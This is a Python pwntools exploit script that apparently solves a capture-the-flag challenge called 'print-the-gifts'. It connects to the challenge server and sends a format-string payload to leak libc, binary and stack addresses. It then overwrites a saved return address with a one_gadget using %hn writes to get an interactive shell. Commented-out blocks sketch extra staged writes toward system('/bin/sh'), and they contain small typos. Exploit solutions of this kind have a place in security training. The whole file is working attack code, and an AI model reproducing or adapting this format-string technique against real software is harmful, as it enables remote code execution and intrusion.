#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


p = process()
p = remote('print-the-gifts.chals.nitectf2024.live', 1337,ssl=True)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001240
#           ''')
payload = b'%43$p|%44$p|%31$p'

p.sendlineafter(b'>',payload)
off_set = 0x27305
off_set2 = 0x1199

p.recvuntil(b'you a ')
leak_libc = int(p.recvuntil(b'|')[:-1],16)
#### leak libc #####
libc.address = leak_libc - off_set
leak_exe = int(p.recvuntil(b'|')[:-1],16)
####leak exe #####
exe.address = leak_exe - off_set2
#### leak stack #####
leak_stack = int(p.recvline()[:-1],16)
one_gadget = 0x4c140 + libc.address
rsp = leak_stack-0x120
rsp1 = rsp + 8
rsp2 = rsp1 + 8
log.info(f"leak stack: {hex(rsp)}")
log.info(f"leak stack 2 : {hex(rsp1)}")
win = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
log.info(f"win {hex(one_gadget)}")
log.info(f"binsh: {hex(binsh)}")
pop_rdi = libc.address + 0x00000000000277e5
ret = pop_rdi+1
package = {
        one_gadget & 0xffff:  rsp,
        one_gadget >> 16 & 0xffff: rsp+2,
        one_gadget >> 32 & 0xffff: rsp+4,
}
order = sorted(package)
print(order)
p.sendlineafter(b'n:\n',b'y')
payload = f"%{order[0]}c%13$hn".encode()
payload += f"%{order[1]-order[0]}c%14$hn".encode()
payload += f"%{order[2]-order[1]}c%15$hn".encode()
payload = payload.ljust(40,b'a')
payload += flat(
        package[order[0]],
        package[order[1]],
        package[order[2]],
        )
input()
p.sendlineafter(b'>',payload)
p.sendlineafter(b'n:\n',b'n')


#package2 = {
#        one_gadget & 0xffff:rsp1,
#        one_gadget >> 16 & 0xffff:rsp1+2,
#        one_gadget >> 32 & 0xffff:rsp1+4,
#        }
#order2 = sorted(package2)

#payload2 = f"%{order2[0]}c%13$hn".encode()
#payload2 += f"%{order2[1]-order2[0]}c%$14$hn".encode()
#payload2 += f"%{order2[2]-order2[1]}c%15$hn".encode()

#payload2 = payload2.ljust(40,b'b')
#payload2 += flat (
#        package2[order2[0]],
#        package2[order2[1]],
#       package2[order2[2]],
#)
#input()
#p.sendlineafter(b'>',payload2)
#p.sendlineafter(b'n:\n',b'n')

#package3 = {
#        win & 0xffff:rsp2,
#        win >> 16 & 0xffff:rsp2+2,
#        win >> 32 & 0xffff:rsp2+4,
#        }
#order3 = sorted(package3)

#payload3 = f"%{order3[0]}c%13$hn".encode()
#payload3 += f"%{order3[1]-order3[0]}c%$14$hn".encode()
#payload3 += f"%{order3[2]-order3[1]}c%15$hn".encode()

#payload3 = payload2.ljust(40,b'b')
#payload3 += flat (
#        package3[order3[0]],
#        package3[order3[1]],
#        package3[order3[2]],
#)
#input()
#p.sendlineafter(b'>',payload3)
#p.sendlineafter(b"n:\n",b'n')
p.interactive()
